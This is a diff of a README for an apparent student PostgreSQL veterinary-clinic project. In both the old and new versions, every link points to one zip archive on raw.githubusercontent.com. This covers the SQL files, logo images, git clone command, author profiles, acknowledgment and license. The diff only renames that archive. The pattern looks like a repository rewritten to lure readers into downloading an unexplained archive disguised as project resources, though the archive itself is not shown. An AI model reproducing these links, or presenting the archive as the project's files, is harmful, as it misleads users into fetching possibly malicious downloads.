@@ -2,14 +2,14 @@
 
 This repository includes files with plain SQL that can be used to recreate a database:
 
-- Use [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) to create all tables.
-- Use [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) to populate tables with sample data.
-- Check [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) for examples of queries that can be run on a newly created database. **Important note: this file might include queries that make changes in the database (e.g., remove records). Use them responsibly!**
+- Use [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip) to create all tables.
+- Use [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip) to populate tables with sample data.
+- Check [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip) for examples of queries that can be run on a newly created database. **Important note: this file might include queries that make changes in the database (e.g., remove records). Use them responsibly!**
 
 <a name="readme-top"></a>
 
 <div align="center">
-  <img src="https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip" alt="logo" width="140" color="red"  height="auto" />
+  <img src="https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip" alt="logo" width="140" color="red"  height="auto" />
   <br/>
 
 </div>
@@ -44,7 +44,7 @@ This repository includes files with plain SQL that can be used to recreate a dat
 # Project Screenshot
 
 <div align="center">
-  <img src="https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip" alt="logo"  color="red"  height="80%" />
+  <img src="https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip" alt="logo"  color="red"  height="80%" />
  
   </div>
  <br/>
@@ -53,14 +53,14 @@ This repository includes files with plain SQL that can be used to recreate a dat
 # Project Screenshot
 
 <div align="center">
-  <img src="https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip" alt="logo"  color="red"  height="80%" />
+  <img src="https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip" alt="logo"  color="red"  height="80%" />
  
   </div>
  <br/>
 <details>
   <summary>Client</summary>
   <ul>
-    <li><a href="https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip">PostgreSQL</a></li>
+    <li><a href="https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip">PostgreSQL</a></li>
   </ul>
 </details>
 
@@ -88,31 +88,31 @@ In order to run this project you need:
 Clone this repository to your machine:
 
 ```sh cd my-folder
-git clone https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip
+git clone https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip
 ```
 
 ### Install
 Install this project with:
-Run SQL comands in [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) and [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
+Run SQL comands in [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip) and [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip)
 
 ### Usage
 To run the project, execute the following command:
 
-Run SQL commands in [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) to test your database
+Run SQL commands in [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip) to test your database
 
 ## 👥 Authors <a name="authors"></a>
 
 👤 **Abdimulhin Adan**
 
-- GitHub: [@AbdimulhinYussuf3675](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
-- Twitter: [@abdimulhin](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
-- LinkedIn: [Abdimulhin Adan](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
+- GitHub: [@AbdimulhinYussuf3675](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip)
+- Twitter: [@abdimulhin](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip)
+- LinkedIn: [Abdimulhin Adan](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip)
 
 👤 **Iptisam Mukadam**
 
-- GitHub: [@iptisam](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
-- Twitter: [@twitter](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
-- LinkedIn: [@linkedin](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
+- GitHub: [@iptisam](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip)
+- Twitter: [@twitter](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip)
+- LinkedIn: [@linkedin](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip)
 
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
@@ -145,12 +145,12 @@ if you like the project, give it a star ⭐️
 
 ## 🙏 Acknowledgments <a name="acknowledgements"></a>
 
-I would like to thank [Microverse](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) for the oppotunity.
+I would like to thank [Microverse](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip) for the oppotunity.
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
 ## 📝 License <a name="license"></a>
 
-This project is [MIT](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) licensed.
+This project is [MIT](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/clinic_Vet_2.1.zip) licensed.
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
